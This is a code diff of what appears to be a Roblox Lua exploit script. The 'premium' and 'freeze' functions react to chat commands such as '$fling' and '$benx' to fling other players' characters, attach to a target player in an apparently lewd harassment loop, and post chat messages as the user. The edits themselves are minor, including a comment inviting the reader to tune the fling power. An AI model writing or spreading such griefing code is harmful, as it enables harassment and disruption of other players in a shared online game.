@@ -59,7 +59,7 @@ function premium()
 			if cht:match("$fling .") then
 				if game.Players.LocalPlayer ~= v then
 					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-					power = 99999999
+					power = 99999999 -- change this to make it more or less powerful
 		 
 					game:GetService('RunService').Stepped:connect(function()
 					game.Players.LocalPlayer.Character.Head.CanCollide = false
@@ -80,7 +80,7 @@ function premium()
 		v.Chatted:connect(function(cht)
 			if cht:match("$benx .") then
 				if game.Players.LocalPlayer ~= v then
-					wait(0)
+					wait(0) print("")
 					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
 					local benxed = true
 					while benxed == true do
@@ -208,7 +208,7 @@ function premium()
 		v.Chatted:connect(function(cht)
 			if cht:match("/e test") then
 				if game.Players.LocalPlayer ~= v then
-					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh yeah!","All")
+					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah, yeah$","All")
 				end
 			end
 		
@@ -260,7 +260,7 @@ local freeze = function()
 			if cht:match("$fling .") then
 				if game.Players.LocalPlayer ~= v then
 					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-					power = 99999999
+					power = 99999999 -- change this to make it more or less powerful
 		 
 					game:GetService('RunService').Stepped:connect(function()
 					game.Players.LocalPlayer.Character.Head.CanCollide = false
@@ -281,7 +281,7 @@ local freeze = function()
 		v.Chatted:connect(function(cht)
 			if cht:match("$benx .") then
 				if game.Players.LocalPlayer ~= v then
-					wait(0)
+					wait(0) print("")
 					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
 					local benxed = true
 					while benxed == true do
@@ -409,7 +409,7 @@ local freeze = function()
 		v.Chatted:connect(function(cht)
 			if cht:match("/e test") then
 				if game.Players.LocalPlayer ~= v then
-					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh yeah!","All")
+					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah, yeah$","All")
 				end
 			end
 		
